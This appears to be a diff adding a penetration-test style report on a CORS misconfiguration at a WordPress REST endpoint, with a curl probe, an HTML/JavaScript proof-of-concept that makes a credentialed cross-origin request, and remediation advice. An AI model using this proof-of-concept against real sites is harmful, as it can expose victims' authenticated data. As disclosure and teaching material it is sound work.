@@ -1,0 +1,76 @@
+CORS 
+
+Summary : Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. However, it also provides potential for cross-domain based attacks, if a website's CORS policy is poorly configured and implemented. CORS can be exploited to trust any arbitrary domain attacker controlled domain name and send the data to it.  Attackers can make an exploit and ask the domain to send data of the victim to the attacker domain.
+
+
+Severity :   High  
+
+CURL Request : curl “https://example.com/wp-json” -I -H Origin:hacktify.in 
+As you can see when we run the above request in curl we can see these header results in the response.  
+
+Access-Control-Allow-Origin: hacktifyin
+Access-Control-Allow-Credentials : true
+
+Complexity : Easy 
+
+From : Remote / External
+
+Steps to Reproduce:
+
+1. Enter the domain name example.com in the POC Code shown below and save it as exploit.html and click on exploit button : 
+
+
+
+Exploit Code :
+
+
+<html>
+<body>
+<center>
+<h2>CORS POC Exploit
+<h3>Extract SID
+
+<div id="demo">
+<button type="button" onclick="cors()">Exploit Click here
+</div>
+
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = alert(this.responseText);
+}
+};
+xhttp.open("GET", "https://example.com/wp-json/", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+
+</body>
+</html>
+
+Proof of Concept : Attached in the Video
+
+
+Impact : An Adversary can carry out CORS attack to exfiltrate the sensitive details of a victim
+
+Affected IP's :
+
+IP Address	        Port
+https://www.example/	443
+
+Recommendations : 
+
+All the REST Apis should be authenticated and the domain should not trust any other domains. Allow only selected, trusted domains in the Access-Control-Allow-Origin header.
+ 
+References : 
+
+https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny
+https://www.geekboy.ninja/blog/exploiting-misconfigured-cors-cross-origin-resource-sharing/
+https://en.wikipedia.org/wiki/Cross-origin_resource_sharing
+https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
+
+Proof of Concept :
+
